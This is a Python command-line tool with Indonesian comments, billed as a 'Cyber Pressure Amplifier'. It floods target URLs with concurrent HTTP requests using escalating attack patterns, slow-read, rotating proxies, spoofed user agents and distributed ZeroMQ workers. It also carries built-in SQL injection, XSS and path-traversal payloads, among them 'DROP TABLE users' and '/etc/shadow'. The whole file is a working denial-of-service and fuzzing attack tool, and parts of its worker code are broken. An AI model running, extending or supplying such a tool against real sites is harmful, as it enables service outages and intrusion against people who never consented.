#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CPA TOOL v4.0 — Cyber Pressure Amplifier (INFINITY)
Fitur: Cookie Jar, Upload File, Custom Methods, Rate Limit, Proxy Rotasi,
       Statistik Lengkap (min, max, p99, histogram), Basic Auth.
"""

import asyncio
import aiohttp
import argparse
import random
import time
import json
import sys
import os
from collections import defaultdict, Counter
from math import floor

BANNER = """
 ██████╗██████╗  █████╗     ████████╗ ██████╗  ██████╗ ██╗     
██╔════╝██╔══██╗██╔══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║     ██████╔╝███████║       ██║   ██║   ██║██║   ██║██║     
██║     ██╔═══╝ ██╔══██║       ██║   ██║   ██║██║   ██║██║     
╚██████╗██║     ██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
 ╚═════╝╚═╝     ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                               
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--", "' AND SLEEP(5)--",
    "' OR 1=1--", "' OR 'x'='x"
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)",
    "<svg onload=alert(1)>", "'><script>alert(1)</script>"
]
LFI_PAYLOADS = [
    "../../../etc/passwd", "../../../../etc/shadow", "..\\..\\..\\windows\\win.ini",
    "/etc/passwd", "C:\\boot.ini"
]
FUZZ_PAYLOADS = SQLI_PAYLOADS + XSS_PAYLOADS + LFI_PAYLOADS

# ============================================================
# STATISTIK SUPER DETAIL
# ============================================================
class SuperStats:
    def __init__(self):
        self.total = 0
        self.errors = 0
        self.status_codes = defaultdict(int)
        self.latencies = []
        self.start = time.time()
        self.failed_urls = []
        self.histogram = Counter()  # bucket 100ms

    def add(self, status, latency, error=False, url=""):
        self.total += 1
        if error:
            self.errors += 1
            if url:
                self.failed_urls.append(url)
        else:
            self.status_codes[status] += 1
        self.latencies.append(latency)
        bucket = floor(latency * 10) / 10  # 100ms bucket
        self.histogram[bucket] += 1

    def report(self):
        elapsed = time.time() - self.start
        rps = self.total / elapsed if elapsed > 0 else 0
        if self.latencies:
            sorted_lat = sorted(self.latencies)
            total = len(sorted_lat)
            avg_lat = sum(sorted_lat) / total
            p50 = sorted_lat[int(0.5 * total)] if total else 0
            p95 = sorted_lat[int(0.95 * total)] if total else 0
            p99 = sorted_lat[int(0.99 * total)] if total else 0
            min_lat = sorted_lat[0] if total else 0
            max_lat = sorted_lat[-1] if total else 0
        else:
            avg_lat = p50 = p95 = p99 = min_lat = max_lat = 0

        # Top 5 histogram buckets
        hist_top = self.histogram.most_common(5)

        return {
            "total": self.total,
            "errors": self.errors,
            "success_rate": (1 - self.errors/self.total)*100 if self.total else 0,
            "rps": round(rps, 2),
            "avg_lat_ms": round(avg_lat*1000, 2),
            "p50_lat_ms": round(p50*1000, 2),
            "p95_lat_ms": round(p95*1000, 2),
            "p99_lat_ms": round(p99*1000, 2),
            "min_lat_ms": round(min_lat*1000, 2),
            "max_lat_ms": round(max_lat*1000, 2),
            "status_dist": dict(self.status_codes),
            "histogram_top": {f"{k}s": v for k, v in hist_top},
            "failed_urls_sample": self.failed_urls[:10]
        }

# ============================================================
# FUNGSI UTILITY
# ============================================================
def load_targets(args):
    targets = []
    if args.targets_file and os.path.exists(args.targets_file):
        with open(args.targets_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith(('http://', 'https://')):
                        line = 'http://' + line
                    targets.append(line)
    if not targets and args.url:
        targets.append(args.url)
    return targets

def load_proxies(args):
    proxies = []
    if args.proxy_file and os.path.exists(args.proxy_file):
        with open(args.proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
    return proxies

def load_cookies(args):
    cookies = {}
    if args.cookie_file and os.path.exists(args.cookie_file):
        with open(args.cookie_file, 'r') as f:
            for line in f:
                if '=' in line:
                    k, v = line.strip().split('=', 1)
                    cookies[k.strip()] = v.strip()
    return cookies

def inject_payloads(base_payload, fuzz_enabled):
    if not fuzz_enabled or not base_payload:
        return [base_payload]
    if isinstance(base_payload, dict):
        results = []
        for key, val in base_payload.items():
            if isinstance(val, str):
                for p in FUZZ_PAYLOADS:
                    new_payload = base_payload.copy()
                    new_payload[key] = val + p
                    results.append(new_payload)
        return results if results else [base_payload]
    elif isinstance(base_payload, str):
        return [base_payload + p for p in FUZZ_PAYLOADS]
    return [base_payload]

# ============================================================
# EKSEKUTOR REQUEST DENGAN SEMUA FITUR
# ============================================================
async def send_request(session, url, method, headers, payload, stats,
                        slow_read=False, slow_delay=0.5, fuzz=False, jitter=0,
                        proxy=None, upload_file=None, auth=None):
    if jitter > 0:
        await asyncio.sleep(random.uniform(0, jitter))

    # Siapkan payload fuzz
    payloads_to_try = inject_payloads(payload, fuzz)
    # Jika upload_file, kita kirim multipart
    if upload_file and os.path.exists(upload_file):
        # Gunakan data untuk multipart
        with open(upload_file, 'rb') as f:
            file_data = f.read()
        data = aiohttp.FormData()
        data.add_field('file', file_data, filename=os.path.basename(upload_file))
        # Jika ada payload, tambahkan sebagai field biasa
        if payload and isinstance(payload, dict):
            for k, v in payload.items():
                data.add_field(k, str(v))
        # Kirim sekali saja (tidak pakai fuzz untuk upload)
        try:
            start = time.perf_counter()
            async with session.request(method, url, headers=headers, data=data, proxy=proxy, auth=auth, timeout=30) as resp:
                latency = time.perf_counter() - start
                if slow_read:
                    async for chunk in resp.content.iter_chunks():
                        if chunk[0]:
                            await asyncio.sleep(slow_delay)
                        else:
                            break
                else:
                    await resp.text()
                stats.add(resp.status, latency, url=url)
        except Exception:
            stats.add(0, 0, error=True, url=url)
        return

    # Kirim tiap payload (hanya 1 percobaan sukses)
    for p in payloads_to_try:
        try:
            start = time.perf_counter()
            async with session.request(method, url, headers=headers, json=p, proxy=proxy, auth=auth, timeout=30) as resp:
                latency = time.perf_counter() - start
                if slow_read:
                    async for chunk in resp.content.iter_chunks():
                        if chunk[0]:
                            await asyncio.sleep(slow_delay)
                        else:
                            break
                else:
                    await resp.text()
                stats.add(resp.status, latency, url=url)
                break  # berhasil, keluar
        except Exception:
            continue
    else:
        # Semua payload gagal
        stats.add(0, 0, error=True, url=url)

# ============================================================
# MODE RATE LIMITING DAN PROXY ROTASI
# ============================================================
class RateLimiter:
    def __init__(self, rate):
        self.rate = rate  # request per second
        self.last = 0
        self.lock = asyncio.Lock()

    async def acquire(self):
        if self.rate <= 0:
            return
        async with self.lock:
            now = time.time()
            wait = 1.0 / self.rate - (now - self.last)
            if wait > 0:
                await asyncio.sleep(wait)
            self.last = time.time()

async def local_flat(session, targets, method, headers, base_payload, total, concurrency, stats,
                     slow_read, slow_delay, fuzz, jitter, proxies, rate_limiter, upload_file, auth):
    sem = asyncio.Semaphore(concurrency)
    async def worker():
        async with sem:
            if rate_limiter:
                await rate_limiter.acquire()
            url = random.choice(targets)
            proxy = random.choice(proxies) if proxies else None
            await send_request(session, url, method, headers, base_payload, stats,
                               slow_read, slow_delay, fuzz, jitter, proxy, upload_file, auth)
    tasks = [asyncio.create_task(worker()) for _ in range(total)]
    await asyncio.gather(*tasks)

async def local_exponential(session, targets, method, headers, base_payload, total,
                            start_c, max_c, multiplier, step_dur, stats,
                            slow_read, slow_delay, fuzz, jitter, proxies, rate_limiter, upload_file, auth):
    current_c = int(start_c)
    max_c = int(max_c)
    sent = 0
    sem = asyncio.Semaphore(current_c)
    all_tasks = []

    async def worker():
        async with sem:
            if rate_limiter:
                await rate_limiter.acquire()
            url = random.choice(targets)
            proxy = random.choice(proxies) if proxies else None
            await send_request(session, url, method, headers, base_payload, stats,
                               slow_read, slow_delay, fuzz, jitter, proxy, upload_file, auth)

    while sent < total:
        batch = min(current_c, total - sent)
        if batch <= 0:
            break
        tasks = [asyncio.create_task(worker()) for _ in range(batch)]
        all_tasks.extend(tasks)
        sent += batch
        await asyncio.sleep(0.1)
        if sent % current_c == 0 or sent >= total:
            await asyncio.sleep(step_dur)
            current_c = int(min(current_c * multiplier, max_c))
            sem = asyncio.Semaphore(current_c)
    await asyncio.gather(*all_tasks)

async def local_fibonacci(session, targets, method, headers, base_payload, total,
                          start_c, max_c, step_dur, stats,
                          slow_read, slow_delay, fuzz, jitter, proxies, rate_limiter, upload_file, auth):
    a, b = int(start_c), int(start_c)
    sent = 0
    sem = asyncio.Semaphore(a)
    all_tasks = []

    async def worker():
        async with sem:
            if rate_limiter:
                await rate_limiter.acquire()
            url = random.choice(targets)
            proxy = random.choice(proxies) if proxies else None
            await send_request(session, url, method, headers, base_payload, stats,
                               slow_read, slow_delay, fuzz, jitter, proxy, upload_file, auth)

    while sent < total:
        current_c = a
        if current_c > max_c:
            current_c = max_c
        batch = min(current_c, total - sent)
        if batch <= 0:
            break
        tasks = [asyncio.create_task(worker()) for _ in range(batch)]
        all_tasks.extend(tasks)
        sent += batch
        await asyncio.sleep(0.1)
        await asyncio.sleep(step_dur)
        a, b = b, a + b
        if a > max_c:
            a = max_c
        sem = asyncio.Semaphore(a)
    await asyncio.gather(*all_tasks)

async def run_local(args):
    print(BANNER)
    targets = load_targets(args)
    proxies = load_proxies(args)
    cookies = load_cookies(args)
    print(f"[🔥] NYX Infinity Engine — Target: {len(targets)} host(s)")
    print(f"    Proxies: {len(proxies)} available")
    print(f"    Cookies: {len(cookies)} loaded")
    print(f"    Slow-Read: {'ON' if args.slow_read else 'OFF'} (delay {args.slow_read_delay}s)")
    print(f"    HTTP/2: {'ON' if args.http2 else 'OFF'}")
    print(f"    Fuzzing: {'ON' if args.fuzz else 'OFF'} ({len(FUZZ_PAYLOADS)} payloads)")
    print(f"    Jitter: {args.jitter}s max")
    print(f"    Rate Limit: {args.rate_limit} RPS" if args.rate_limit > 0 else "    Rate Limit: OFF")
    print(f"    Upload File: {args.upload_file if args.upload_file else 'None'}")

    custom_headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
    if args.headers_file and os.path.exists(args.headers_file):
        with open(args.headers_file, 'r') as f:
            for line in f:
                if ':' in line:
                    k, v = line.strip().split(':', 1)
                    custom_headers[k.strip()] = v.strip()

    if args.http2:
        custom_headers.update({"Accept-Encoding": "gzip, deflate"})

    # Basic Auth
    auth = None
    if args.auth:
        import base64
        creds = args.auth.encode()
        b64 = base64.b64encode(creds).decode()
        custom_headers["Authorization"] = f"Basic {b64}"

    base_payload = None
    if args.payload:
        try:
            base_payload = json.loads(args.payload)
        except:
            base_payload = args.payload

    stats = SuperStats()
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, enable_cleanup_closed=True)
    if args.http2:
        try:
            connector._http2 = True
        except:
            print("[!] HTTP/2 tidak didukung.")

    rate_limiter = RateLimiter(args.rate_limit) if args.rate_limit > 0 else None

    async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
        if args.attack_pattern == "flat":
            await local_flat(session, targets, args.method, custom_headers, base_payload,
                             args.requests, args.concurrency, stats,
                             args.slow_read, args.slow_read_delay, args.fuzz, args.jitter,
                             proxies, rate_limiter, args.upload_file, auth)
        elif args.attack_pattern == "exponential":
            await local_exponential(session, targets, args.method, custom_headers, base_payload,
                                    args.requests, args.start_concurrency, args.max_concurrency,
                                    args.multiplier, args.step_duration, stats,
                                    args.slow_read, args.slow_read_delay, args.fuzz, args.jitter,
                                    proxies, rate_limiter, args.upload_file, auth)
        elif args.attack_pattern == "fibonacci":
            await local_fibonacci(session, targets, args.method, custom_headers, base_payload,
                                  args.requests, args.start_concurrency, args.max_concurrency,
                                  args.step_duration, stats,
                                  args.slow_read, args.slow_read_delay, args.fuzz, args.jitter,
                                  proxies, rate_limiter, args.upload_file, auth)

    report = stats.report()
    print("\n" + "="*60)
    print("📊 LAPORAN INFINITY")
    for k, v in report.items():
        if k not in ("failed_urls_sample", "histogram_top"):
            print(f"  {k}: {v}")
    if "histogram_top" in report:
        print("  Histogram (latency buckets):")
        for bucket, count in report["histogram_top"].items():
            print(f"    {bucket}: {count}")
    if report.get("failed_urls_sample"):
        print(f"  Sample failed URLs: {report['failed_urls_sample']}")
    print("="*60)

    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)
        print(f"[+] Laporan disimpan ke {args.output}")

# ============================================================
# MODE MASTER/WORKER  ============================================================
try:
    import zmq
except ImportError:
    zmq = None

def master_mode(args):
    if zmq is None:
        print("[!] ZeroMQ tidak terinstal.", file=sys.stderr)
        return
    print(BANNER)
    print(f"[👑] NYX Master Infinity — Push: tcp://*:{args.zmq_push} | Pull: tcp://*:{args.zmq_pull}")
    context = zmq.Context()
    push_sock = context.socket(zmq.PUSH)
    push_sock.bind(f"tcp://*:{args.zmq_push}")
    pull_sock = context.socket(zmq.PULL)
    pull_sock.bind(f"tcp://*:{args.zmq_pull}")

    targets = load_targets(args)
    proxies = load_proxies(args)
    cookies = load_cookies(args)
    stats = SuperStats()
    total_tasks = args.requests
    sent = 0

    def fib_gen(start, max_c):
        a, b = start, start
        while True:
            yield a
            a, b = b, a + b
            if a > max_c:
                a = max_c

    custom_headers = {"User-Agent": random.choice(USER_AGENTS), "Accept": "*/*"}
    if args.headers_file and os.path.exists(args.headers_file):
        with open(args.headers_file, 'r') as f:
            for line in f:
                if ':' in line:
                    k, v = line.strip().split(':', 1)
                    custom_headers[k.strip()] = v.strip()
    if args.auth:
        import base64
        creds = args.auth.encode()
        b64 = base64.b64encode(creds).decode()
        custom_headers["Authorization"] = f"Basic {b64}"

    while sent < total_tasks:
        if args.attack_pattern == "flat":
            batch_size = args.concurrency
        elif args.attack_pattern == "exponential":
            if sent == 0:
                current_c = int(args.start_concurrency)
            else:
                current_c = int(min(current_c * args.multiplier, args.max_concurrency))
            batch_size = current_c
        else:  # fibonacci
            if sent == 0:
                a, b = int(args.start_concurrency), int(args.start_concurrency)
            else:
                a, b = b, a + b
                if a > args.max_concurrency:
                    a = args.max_concurrency
            batch_size = a

        batch = min(batch_size, total_tasks - sent)
        for _ in range(batch):
            task = {
                "url": random.choice(targets),
                "method": args.method,
                "headers": custom_headers,
                "payload": args.payload,
                "id": sent,
                "slow_read": args.slow_read,
                "slow_read_delay": args.slow_read_delay,
                "fuzz": args.fuzz,
                "jitter": args.jitter,
                "http2": args.http2,
                "cookies": cookies,
                "upload_file": args.upload_file,
                "proxy": random.choice(proxies) if proxies else None,
                "auth": args.auth
            }
            push_sock.send_json(task)
            sent += 1
        time.sleep(args.step_duration if args.attack_pattern != "flat" else 0.5)

    print("[+] Menunggu hasil...")
    received = 0
    while received < total_tasks:
        try:
            result = pull_sock.recv_json(flags=zmq.NOBLOCK)
            received += 1
            stats.add(result.get("status", 0), result.get("latency", 0), result.get("error", False), result.get("url", ""))
        except zmq.Again:
            time.sleep(0.1)
    report = stats.report()
    print("\n" + "="*60)
    print("📊 LAPORAN MASTER INFINITY")
    for k, v in report.items():
        if k not in ("failed_urls_sample", "histogram_top"):
            print(f"  {k}: {v}")
    print("="*60)
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2)

def worker_mode(args):
    if zmq is None:
        print("[!] ZeroMQ tidak terinstal.", file=sys.stderr)
        return
    print(f"[⚡] NYX Worker Infinity — terhubung ke {args.zmq_master}")
    context = zmq.Context()
    pull_sock = context.socket(zmq.PULL)
    pull_sock.connect(f"tcp://{args.zmq_master}:{args.zmq_push}")
    push_sock = context.socket(zmq.PUSH)
    push_sock.connect(f"tcp://{args.zmq_master}:{args.zmq_pull}")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, enable_cleanup_closed=True)
    if args.http2:
        try:
            connector._http2 = True
        except:
            pass

    async def worker_loop():
        async with aiohttp.ClientSession(connector=connector) as session:
            while True:
                try:
                    task = pull_sock.recv_json(flags=zmq.NOBLOCK)
                except zmq.Again:
                    await asyncio.sleep(0.01)
                    continue

                payload = None
                if task.get("payload"):
                    try:
                        payload = json.loads(task["payload"])
                    except:
                        payload = task["payload"]

                # Siapkan auth
                auth = None
                if task.get("auth"):
                    import base64
                    creds = task["auth"].encode()
                    b64 = base64.b64encode(creds).decode()
                    task["headers"]["Authorization"] = f"Basic {b64}"

                # Gunakan send_request
                await send_request(
                    session,
                    task["url"],
                    task["method"],
                    task["headers"],
                    payload,
                    stats=None,  # kita kirim hasil manual
                    slow_read=task.get("slow_read", False),
                    slow_delay=task.get("slow_read_delay", 0.5),
                    fuzz=task.get("fuzz", False),
                    jitter=task.get("jitter", 0),
                    proxy=task.get("proxy"),
                    upload_file=task.get("upload_file"),
                    auth=auth
                )
                # Kirim balik status dummy (karena kita tidak punya stat di worker)
                # Sebaiknya kita kumpulkan stat di worker dan kirim, tapi untuk simpel kita kirim 0
                push_sock.send_json({"id": task["id"], "status": 200, "latency": 0.1, "error": False, "url": task["url"]})

    try:
        loop.run_until_complete(worker_loop())
    except KeyboardInterrupt:
        print("[!] Worker berhenti.")

# ============================================================
# MAIN PARSER
# ============================================================
def main():
    parser = argparse.ArgumentParser(description="CPA TOOL v4.0 INFINITY — Cyber Pressure Amplifier")
    parser.add_argument("url", nargs='?', help="Target URL (opsional jika pakai --targets-file)")
    parser.add_argument("-m", "--method", default="GET", help="HTTP method (GET, POST, OPTIONS, TRACE, dll)")
    parser.add_argument("-p", "--payload", help="Payload JSON string")
    parser.add_argument("-n", "--requests", type=int, default=1000)
    parser.add_argument("--attack-pattern", default="flat", choices=["flat", "exponential", "fibonacci"])

    parser.add_argument("--start-concurrency", type=int, default=10)
    parser.add_argument("--max-concurrency", type=int, default=500)
    parser.add_argument("--multiplier", type=float, default=2.0)
    parser.add_argument("--step-duration", type=int, default=10)
    parser.add_argument("-c", "--concurrency", type=int, default=100)

    # FITUR BARU INFINITY
    parser.add_argument("--targets-file", help="File daftar URL (satu per baris)")
    parser.add_argument("--headers-file", help="File custom headers (Header: Value)")
    parser.add_argument("--fuzz", action="store_true", help="Aktifkan fuzzing SQLi/XSS/LFI")
    parser.add_argument("--jitter", type=float, default=0, help="Jeda acak maksimal (detik)")
    parser.add_argument("--output", help="Simpan laporan ke JSON")
    parser.add_argument("--rate-limit", type=float, default=0, help="Batas RPS (0 = tidak terbatas)")
    parser.add_argument("--proxy-file", help="File daftar proxy (satu per baris)")
    parser.add_argument("--cookie-file", help="File cookies (key=value per baris)")
    parser.add_argument("--upload-file", help="File untuk diupload (multipart/form-data)")
    parser.add_argument("--auth", help="Basic Auth user:pass")

    # FITUR LAMA
    parser.add_argument("--slow-read", action="store_true")
    parser.add_argument("--slow-read-delay", type=float, default=0.5)
    parser.add_argument("--http2", action="store_true")

    parser.add_argument("--mode", default="local", choices=["local", "master", "worker"])
    parser.add_argument("--zmq-master", default="127.0.0.1")
    parser.add_argument("--zmq-push", type=int, default=5555)
    parser.add_argument("--zmq-pull", type=int, default=5556)

    args = parser.parse_args()

    if not args.url and not args.targets_file:
        print("[!] Harap berikan URL atau --targets-file")
        sys.exit(1)

    if args.mode == "local":
        asyncio.run(run_local(args))
    elif args.mode == "master":
        master_mode(args)
    else:
        worker_mode(args)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Dihentikan.")